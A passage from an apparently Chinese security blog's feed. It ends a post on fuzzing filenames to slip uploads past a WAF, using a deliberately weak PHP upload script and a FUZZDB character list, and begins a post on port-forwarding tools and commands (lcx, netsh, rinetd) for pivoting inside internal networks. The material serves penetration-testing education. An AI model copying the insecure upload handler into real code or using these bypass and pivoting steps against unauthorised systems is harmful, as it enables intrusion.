&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;一般WAF会选择快速匹配上传数据包中的&lt;code class=&quot;highlighter-rouge&quot;&gt;filename&lt;/code&gt;，而不会首要验证文件的内容，因为消耗资源。&lt;/p&gt;

&lt;p&gt;知道了这个我们可以搭建一个简单的上传页面进行上传测试&lt;/p&gt;

&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(((&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_FILES&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;file&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;][&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;type&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;image/gif&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_FILES&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;file&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;][&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;type&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;image/jpeg&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_FILES&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;file&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;][&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;type&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;image/pjpeg&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_FILES&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;file&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;][&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;type&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;image/png&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_FILES&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;file&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;][&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;size&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;20000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_FILES&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;file&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;][&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;error&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Return Code: &quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_FILES&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;file&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;][&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;error&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&amp;lt;br /&amp;gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Upload: &quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_FILES&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;file&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;][&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;name&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&amp;lt;br /&amp;gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Type: &quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_FILES&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;file&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;][&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;type&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&amp;lt;br /&amp;gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Size: &quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_FILES&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;file&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;][&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;size&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;/&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1024&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot; Kb&amp;lt;br /&amp;gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Temp file: &quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_FILES&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;file&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;][&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;tmp_name&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&amp;lt;br /&amp;gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;file_exists&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;upload/&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_FILES&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;file&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;][&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;name&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]))&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_FILES&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;file&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;][&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;name&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot; already exists. &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
	&lt;span class=&quot;nv&quot;&gt;$newfileName&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;rand&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_FILES&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;file&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;][&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;name&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
      &lt;span class=&quot;nb&quot;&gt;move_uploaded_file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_FILES&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;file&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;][&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;tmp_name&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt;
      &lt;span class=&quot;s2&quot;&gt;&quot;upload/&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$newfileName&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Stored in: &quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;upload/&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$newfileName&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Invalid file&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;然后寻找一些文件名中不经常出现的字符(从FUZZDB中寻找)。&lt;/p&gt;

&lt;p&gt;我这里找了一部分：&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;%2500
%2501
%2502
%2503
%2504
%2505
%2506
%2507
%2508
%2509
%250a
%250b
%250c
%250d
%250e
%250f
%2510
%2511
%2512
%2513
!
&quot;
#
$
%
&amp;amp;
'
(
)
*
+
,
-
.
/
0
1
2
3
4
5
6
7
8
9
:
;
&amp;lt;
=
&amp;gt;
?
@
A
B
C
D
E
F
G
H
I
J
K
L
M
N
O
P
Q
R
S
T
U
V
W
X
Y
Z
[
\
]
^
_
`
a
b
c
d
e
f
g
h
i
j
k
l
m
n
o
p
q
r
s
t
u
v
w
x
y
z
{
|
}
~
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;它们的顺序和组合方式都可以任你掌控。&lt;/p&gt;

&lt;p&gt;我导入到Burp中，准备枚举了一轮：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-02-05/0x03.png&quot; alt=&quot;Burp&quot; /&gt;&lt;/p&gt;

&lt;p&gt;可以看到我只添加了三个变量，分别对应一些编码、特殊字符、英文字母，就出来了一些意想不到的结果&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-02-05/0x04.png&quot; alt=&quot;Burp&quot; /&gt;&lt;/p&gt;

&lt;p&gt;然后跟进分析：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-02-05/0x05.png&quot; alt=&quot;Burp&quot; /&gt;&lt;/p&gt;

&lt;p&gt;经过三四次测试，结果发现filename中若存在单引号就可以绕过WAF进行上传。&lt;/p&gt;

&lt;p&gt;这无疑是一个好消息，证明了Fuzzing的强大。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-02-05/0x06.png&quot; alt=&quot;文件&quot; /&gt;&lt;/p&gt;

&lt;p&gt;去访问文件的时候发现一个坑，这个文件本身是存在的，是不是操作系统或者Web服务器的原因导致携带单引号的文件名无法读取？&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-02-05/0x07.png&quot; alt=&quot;文件&quot; /&gt;&lt;/p&gt;

&lt;p&gt;经过思考结论如下：&lt;/p&gt;

&lt;p&gt;即使将单引号进行编码也无法通过浏览器访问，因为它会将URL解码。&lt;/p&gt;

&lt;p&gt;我们直接通过Burp访问即可：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-02-05/0x08.png&quot; alt=&quot;文件&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;0x06-思考&quot;&gt;0x06 思考&lt;/h2&gt;

&lt;p&gt;WAF的出现对于没有安全防护意识的用户来说真的是一个福音，也包括国内一些小众cms都强烈建议用户在服务器上安装一些软WAF。&lt;/p&gt;

&lt;p&gt;我个人觉得这种情况很不理想，并且不会推动安全产业的良性发展，真正的测试就该直面问题，直起腰板说：“你们的WAF防护能力不行，但是你们的应用出现了漏洞比WAF更加垃圾。”&lt;/p&gt;

&lt;p&gt;许多站长的网站被攻击、挂马，我觉得不应该是WAF服务商背锅，真正背锅的还是安全意识，矛头应该指向整个产品线负责的相关人员。&lt;/p&gt;

&lt;p&gt;写到这里，若有任何想法和建议，可以移步About，添加我的微信交流。&lt;/p&gt;

</description>
        <pubDate>Mon, 05 Feb 2018 00:00:00 +0800</pubDate>
        <link>http://localhost:4000/archivers/2018-02-05/1</link>
        <guid isPermaLink="true">http://localhost:4000/archivers/2018-02-05/1</guid>
        
        
        <category>fuzz</category>
        
      </item>
    
      <item>
        <title>内网渗透常见端口转发方式</title>
        <description>&lt;p&gt;本篇文章主要是总结一下常见端口转发姿势。
&lt;!--more--&gt;&lt;/p&gt;
&lt;h2 id=&quot;0x01-前言&quot;&gt;0x01 前言&lt;/h2&gt;

&lt;p&gt;由于在内网渗透的过程中面对的网络环境都是千奇百怪的，我们需要探测连接情况。&lt;/p&gt;

&lt;p&gt;需要使用到端口转发技术来让我们访问到内网其他主机中，或者将内网中某个端口转发到本地。&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;端口映射 ： 端口映射是将一台主机的内网(LAN)IP地址映射成一个公网(WAN)IP地址，当用户访问提供映射端口主机的某个端口时，服务器将请求转移到本地局域网内部提供这种特定服务的主机；&lt;/li&gt;
  &lt;li&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;工具列表：&lt;/p&gt;

&lt;hr /&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;工具名称&lt;/th&gt;
      &lt;th&gt;主要用途&lt;/th&gt;
      &lt;th&gt;平台&lt;/th&gt;
      &lt;th&gt;备注&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;lcx&lt;/td&gt;
      &lt;td&gt;端口映射&lt;/td&gt;
      &lt;td&gt;Windows&lt;/td&gt;
      &lt;td&gt;只支持tcp协议的端口转发，非系统内置&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;netsh&lt;/td&gt;
      &lt;td&gt;端口映射&lt;/td&gt;
      &lt;td&gt;Windows&lt;/td&gt;
      &lt;td&gt;只支持tcp协议的端口转发&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;rinetd&lt;/td&gt;
      &lt;td&gt;反向代理&lt;/td&gt;
      &lt;td&gt;Linux&lt;/td&gt;
      &lt;td&gt;需要安装包&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;Earthworm&lt;/td&gt;
      &lt;td&gt;端口映射、Socks5代理&lt;/td&gt;
      &lt;td&gt;Linux、Windows、MacOS、Arm-Linux&lt;/td&gt;
      &lt;td&gt;非系统内置&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;reGeorg&lt;/td&gt;
      &lt;td&gt;Socks5 代理&lt;/td&gt;
      &lt;td&gt;常见脚本语言&lt;/td&gt;
      &lt;td&gt;需脚本环境执行，且网络状况较好&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;Metasploit portfwd&lt;/td&gt;
      &lt;td&gt;端口映射&lt;/td&gt;
      &lt;td&gt;MSF -&amp;gt; Metpreter会话&lt;/td&gt;
      &lt;td&gt;需要网络状况较好&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;socat&lt;/td&gt;
      &lt;td&gt;端口映射&lt;/td&gt;
      &lt;td&gt;Linux&lt;/td&gt;
      &lt;td&gt;可能需要安装&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;Metasploit-&amp;gt;socks4a&lt;/td&gt;
      &lt;td&gt;反向代理&lt;/td&gt;
      &lt;td&gt;MSF -&amp;gt; Metpreter会话&lt;/td&gt;
      &lt;td&gt;需要会话主机有外网代理IP&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;tunna&lt;/td&gt;
      &lt;td&gt;HTTP隧道&lt;/td&gt;
      &lt;td&gt;常见脚本语言&lt;/td&gt;
      &lt;td&gt;需脚本环境执行，且网络状况较好&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;h3 id=&quot;网络拓扑&quot;&gt;网络拓扑&lt;/h3&gt;

&lt;p&gt;&lt;img src=&quot;http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-02-03/0x01.png&quot; alt=&quot;网络拓扑&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;0x02-lcx&quot;&gt;0x02 lcx&lt;/h2&gt;

&lt;h3 id=&quot;lcx-参数&quot;&gt;lcx 参数&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;lcx-&amp;lt;listen|tran|slave&amp;gt; &amp;lt;option&amp;gt; [-log logfile]
[option:]

 -listen &amp;lt;监听端口&amp;gt; &amp;lt;转发端口&amp;gt; 

 -tran&amp;lt;监听端口&amp;gt; &amp;lt;目标地址&amp;gt; &amp;lt;目标端口&amp;gt;

 -slave &amp;lt;目标主机&amp;gt; &amp;lt;目标端口&amp;gt; &amp;lt;本地主机&amp;gt;&amp;lt;本机端口&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;端口映射---无法访问内网情况下&quot;&gt;端口映射 - 无法访问内网情况下&lt;/h3&gt;

&lt;blockquote&gt;
  &lt;p&gt;网络情况：A无法访问B主机上的端口，但B可以访问外网&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;在这种常见的内网环境下，我们可以使用LCX这款工具来帮助我们实现一个端口映射。&lt;/p&gt;

&lt;p&gt;首先在A主机上监听两个端口，这两个端口用于交换B主机发送来的数据以及转发A主机发送的数据。&lt;/p&gt;

&lt;p&gt;这个原理可能有些烧脑，但是仔细跟着我做一遍相信你可以有一个大概的认识 :)&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;A主机上执行命令：&lt;code class=&quot;highlighter-rouge&quot;&gt;lcx.exe -listen 4455 1234&lt;/code&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;B主机上执行命令：&lt;code class=&quot;highlighter-rouge&quot;&gt;lcx.exe -slave {A主机IP地址} {A主机端口} {B主机本地IP地址} {B主机某个需要转发出去的端口}&lt;/code&gt;&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;PS：这两条命令没有先后顺序，谁先执行都可以，建议先在A主机监听后再去执行B主机上的命令。&lt;/p&gt;

&lt;p&gt;原理简述：&lt;/p&gt;

&lt;p&gt;A主机首先监听的两个端口为 4455 和 1234 ，大概意思就是将4455接收到的主机转发给1234。当然执行这条命令之前，要保证4455及1234未被其他应用程序占用，并且A主机必须是一个B主机能够进行通信的IP地址。&lt;/p&gt;

&lt;p&gt;B主机会首先连接A主机的4455端口，此时A主机与B主机建立连接状态，如果我们访问A主机的1234端口，我们发送的数据会经过4455端口发送给B主机需要转发的目标端口。&lt;/p&gt;

&lt;p&gt;大致就是 A与B要建立一个通道，将1234的数据不断的传送到B上的目标端口，中间也包括B主机目标端口响应的数据。&lt;/p&gt;

&lt;h3 id=&quot;端口转发---能够访问内网某台主机&quot;&gt;端口转发 - 能够访问内网某台主机&lt;/h3&gt;

&lt;blockquote&gt;
  &lt;p&gt;网络情况：A能够访问B主机的任何端口，但是无法访问C主机上的端口&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;这种大部分情况是A已经能够轻松B主机，而想要去访问C，可以使用LCX的tran参数。&lt;/p&gt;

&lt;p&gt;在B主机上执行：&lt;code class=&quot;highlighter-rouge&quot;&gt;lcx.exe -tran {监听端口} {C主机IP地址} {C主机端口}&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;此时我们访问B主机上监听的端口就相当于访问了C主机上的端口。&lt;/p&gt;

&lt;h2 id=&quot;0x03-netsh&quot;&gt;0x03 netsh&lt;/h2&gt;

&lt;blockquote&gt;
  &lt;p&gt;网络情况：A无法连接C的端口，但是可以连接B，所以能在B上进行端口转发&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h3 id=&quot;说明&quot;&gt;说明&lt;/h3&gt;

&lt;p&gt;netsh工具都自带portproxy功能。目前只支持tcp协议的端口转发，前提需要作为portproxy的主机需要安装IPV6,安装可以不启用IPV6。&lt;/p&gt;

&lt;h3 id=&quot;安装ipv6&quot;&gt;安装IPV6&lt;/h3&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;netsh  interface ipv6 install&lt;/code&gt;&lt;/p&gt;

&lt;h3 id=&quot;转发&quot;&gt;转发&lt;/h3&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;netsh interface portproxy add v4tov4 listenaddress=10.10.18.1 listenport=4455 connectaddress=10.10.12.1  connectport=8080
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;此时A访问B(10.10.18.1)的4455端口就相当于访问C(10.10.12.1)的8080端口&lt;/strong&gt;&lt;/p&gt;

&lt;h3 id=&quot;删除转发记录&quot;&gt;删除转发记录&lt;/h3&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;netsh interface portproxy delete v4tov4 listenaddress={B的IP}  listenport={B的端口}&lt;/code&gt;&lt;/p&gt;

&lt;h3 id=&quot;查看转发记录&quot;&gt;查看转发记录&lt;/h3&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;netsh interface portproxy show  v4tov4&lt;/code&gt;&lt;/p&gt;

&lt;h2 id=&quot;0x04-rinetd&quot;&gt;0x04 rinetd&lt;/h2&gt;

&lt;blockquote&gt;
  &lt;p&gt;网络情况：A无法连接C的端口，但是可以连接B，所以能在B上进行端口转发&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;linux下简单好用的工具rinetd，实现端口映射/转发/重定向&lt;/p&gt;

&lt;p&gt;Rinetd是为在一个Unix和Linux操作系统中为重定向传输控制协议(TCP)连接的一个工具。Rinetd是单一过程的服务器，它处理任何数量的连接到在配置文件&lt;code class=&quot;highlighter-rouge&quot;&gt;etc/rinetd&lt;/code&gt;中指定的地址/端口对。尽管rinetd使用非闭锁I/O运行作为一个单一过程，它可能重定向很多连接而不对这台机器增加额外的负担。&lt;/p&gt;

&lt;p&gt;官网地址:http://www.boutell.com/rinetd&lt;/p&gt;

&lt;p&gt;软件下载:wget http://www.boutell.com/rinetd/http/rinetd.tar.gz&lt;/p&gt;

&lt;h3 id=&quot;安装&quot;&gt;安装&lt;/h3&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;tar &lt;/span&gt;zxvf rinetd.tar.gz
&lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;rinetd
make
make &lt;span class=&quot;nb&quot;&gt;install&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

